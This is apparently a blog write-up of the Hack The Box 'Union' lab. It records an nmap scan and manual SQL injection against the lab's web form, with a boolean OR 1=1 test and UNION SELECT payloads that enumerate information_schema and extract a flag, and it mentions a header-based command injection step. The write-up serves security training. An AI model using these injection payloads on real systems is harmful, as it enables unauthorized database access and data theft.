---
title: Hack The Box - CTF Lab - Union - Medium
date: 2025-04-12 00:00:01 +0800
image: /images/Union.png
categories: [HTB Labs]
tags: [CPTS, Medium]
---
Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses.

Let's start with a full nmap scan:
```
sudo nmap -sC -sV -p- 10.10.11.128

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 01:08 EDT
Nmap scan report for 10.10.11.128
Host is up (0.023s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.98 seconds
```
Looks like all we have is port 80, lets visit the website. 

We see an input form called a player eligibility check, so we run BurpSuite. We enter below as a common SQL injection attack and open the request in BurpSuite, then send it to BurpSuite repeater:
```
' OR 1=1 --
```
We get the following:
```
POST /index.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 18
Origin: http://10.10.11.128
Connection: keep-alive
Referer: http://10.10.11.128/
Cookie: PHPSESSID=9uf6a5q2l73foq6t3icrscqfvt
Priority: u=0

player' OR 1=1 --
```
We see that the SQL commenting out command "--" is removing the line that is giving us the "Complete the challenge" link, meaning that the sql injection is working. 

We now try a different request to list out all of the SQL databases on the server:
```
player=' UNION SELECT group_concat(SCHEMA_NAME) from information_schema.schemata-- - 
```
and we get a list: mysql,information_schema,performance_schema,sys,november.

All the databases are the mySQL default databases except for november.

We try to enumerate the november database:
```
player=' UNION SELECT group_concat(COLUMN_name, TABLE_name) from information_schema.columns where TABLE_SCHEMA LIKE "november" -- -

Sorry, oneflag,playerplayers you are not eligible due to already qualifying.
```
We get the two tables "flag" and "player" with the respective columns "one" and "player."

We now get the flag value:
```
player=' UNION SELECT group_concat(one) from november.flag -- -

UHC{F1rst_5tep_2_Qualify}
```
### First Flag Found


